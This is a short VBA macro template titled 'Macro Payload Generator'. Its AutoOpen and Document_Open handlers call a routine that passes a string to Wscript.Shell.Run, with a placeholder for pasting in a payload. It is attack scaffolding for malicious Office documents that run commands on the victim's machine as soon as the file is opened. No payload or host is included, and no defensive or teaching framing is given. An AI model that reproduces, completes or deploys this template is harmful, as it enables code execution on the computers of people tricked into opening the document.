# Macro Payload Generator
    Sub AutoOpen()
        MyMacro
    End Sub
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub MyMacro()
        Dim Str As String
        
        #paste payload here
        
        CreateObject("Wscript.Shell").Run Str
    End Sub
